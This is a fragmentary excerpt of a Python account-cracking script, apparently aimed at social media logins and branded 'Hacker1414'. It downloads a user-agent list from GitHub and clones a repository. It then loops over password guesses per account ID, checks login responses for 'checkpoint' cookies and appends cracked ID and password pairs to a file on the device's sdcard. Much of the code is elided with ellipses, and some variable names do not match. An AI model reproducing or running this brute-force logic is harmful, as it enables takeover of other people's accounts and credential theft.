...
try:
	...
	os.system('git clone https://github.com/Hacker1414')
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mHacker1414')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Hacker1414/blob/main/sonu-ua.txt').text
		ua=open('.ua.txt','w')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r [Hacker1414] {P}{loop}{P}/{P}{len(id)}{P} OK{P}={H}{ok}{P} CP{P}={P}{cp}{x} {P}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H} [] {idf}  {pw}')
				open('/sdcard/Hacker1414.txt','a').write(uid+'|'+pas+'\n')
